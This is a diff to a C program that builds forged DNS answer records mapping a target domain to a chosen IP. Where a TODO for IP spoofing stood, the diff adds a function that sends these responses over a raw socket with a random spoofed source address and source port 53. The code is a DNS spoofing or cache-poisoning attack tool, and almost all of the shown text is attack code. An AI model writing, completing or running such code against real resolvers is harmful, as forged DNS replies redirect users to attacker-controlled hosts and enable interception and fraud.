@@ -10,10 +10,11 @@
 #include <time.h>
 #include <stdlib.h>
 
-#include "dns.h"
+#include "../lib/dns.h"
+#include "../lib/udp.h"
 
 
-//TODO: Spoof IP
+#define DNS_SRC_PORT 53
 
 
 static unsigned int build_answer_section(char *target_ip, uint8_t *dns_answer_section)
@@ -31,7 +32,7 @@ static unsigned int build_answer_section(char *target_ip, uint8_t *dns_answer_se
     answer->class = htons(1);
     answer->ttl = htonl(0x100);//TODO: Think about good ttl.
     answer->rdlength = htons(4);
-    memcpy((void *)(&answer->rdata), (void *)&target_in_addr, 4);
+    memcpy((void *)(&answer->rdata), (void *)&target_in_addr, 4);// TODO is this okay?
 
     return sizeof(struct resource_t);
 }
@@ -50,7 +51,7 @@ unsigned int build_dns_response(uint16_t id, char *target_domain,
 
     dns_hdr = (struct dns_hdr_t *)dns_response;
 
-    dns_hdr->id = id;
+    dns_hdr->id = htons(id);
     dns_hdr->qr = 1;
     dns_hdr->opcode =0;
     dns_hdr->aa = 0;
@@ -85,18 +86,49 @@ unsigned int build_dns_response(uint16_t id, char *target_domain,
 }
 
 
+#define MAX_DNS_RESPONSE_BYTES 1024
+
 void send_dns_response(uint16_t id, char *target_ip,
                        char *target_domain, int sock, struct sockaddr_in dst_addr)
 {
-    uint8_t dns_response[1024];
+    uint8_t dns_response[MAX_DNS_RESPONSE_BYTES];
     unsigned int dns_response_bytes;
+    struct sockaddr_in src_addr;
+
+    memset(&src_addr, 0, sizeof(struct sockaddr_in));
+    src_addr.sin_family = AF_INET;
+    src_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+    src_addr.sin_port = htons(DNS_SRC_PORT);
+    if(bind(sock, (struct sockaddr *)&src_addr, sizeof(struct sockaddr_in)) < 0){
+        perror("bind");
+        exit(1);
+    }
 
     dns_response_bytes = build_dns_response(id, target_domain, target_ip, dns_response);
 
     if(sendto(sock, dns_response, dns_response_bytes, 0, (struct sockaddr *)&dst_addr, sizeof(dst_addr)) < 0){
         perror("sendto");
+        exit(1);
     }
 }
+
+
+void send_spoofed_dns_response(uint16_t id, char *target_ip, char *target_domain,
+                               int raw_sock,
+                               struct sockaddr_in dst_addr)
+{
+    uint8_t dns_response[MAX_DNS_RESPONSE_BYTES];
+    unsigned int dns_response_bytes;
+    struct sockaddr_in src_addr;
+
+    src_addr.sin_family = AF_INET;
+    src_addr.sin_addr.s_addr = (in_addr_t)rand();
+    src_addr.sin_port = htons(DNS_SRC_PORT);
+
+    dns_response_bytes = build_dns_response(id, target_domain, target_ip, dns_response);
+    send_udp_packet(raw_sock, src_addr, dst_addr, dns_response, dns_response_bytes);
+}
+
 
 
 int main(int argc, char *argv[])
@@ -124,3 +156,5 @@ int main(int argc, char *argv[])
 
     return 0;
 }
+
+
